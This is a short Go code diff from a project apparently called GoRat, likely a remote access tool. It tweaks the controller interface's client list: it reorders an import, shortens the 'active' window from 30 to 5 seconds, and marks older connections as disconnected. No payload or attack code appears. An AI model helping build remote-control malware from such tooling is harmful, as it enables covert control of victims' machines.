@@ -6,9 +6,9 @@ import (
 	"strings"
 	"time"
 
-	"github.com/pterm/pterm"
 	go_rat "github.com/AllenDang/giu"
 	"github.com/NotKatsu/GoRat/modules/database"
+	"github.com/pterm/pterm"
 )
 
 type EncodedDataStruct struct {
@@ -42,7 +42,7 @@ func CreateClientTable() []*go_rat.TableRowWidget {
 		currentTime := time.Now()
 		timeDifference := currentTime.Sub(storedTime)
 
-		if timeDifference.Seconds() < 30 {
+		if timeDifference.Seconds() < 5 {
 			substrings := strings.Split(conn.ID, ".")
 
 			NewEncodedDataStruct := EncodedDataStruct{}
@@ -120,7 +120,8 @@ func CreateClientArray() []string {
 		if timeDifference.Seconds() < 5 {
 			connectionString := "New Connection from " + string(connectionID)
 			activeConnections = append(activeConnections, connectionString)
-		} else if timeDifference.Seconds() < 60 {
+
+		} else if timeDifference.Seconds() > 5 {
 			connectionString := "New Connection from " + string(connectionID) + " (Disconnected)"
 			activeConnections = append(activeConnections, connectionString)
 		}
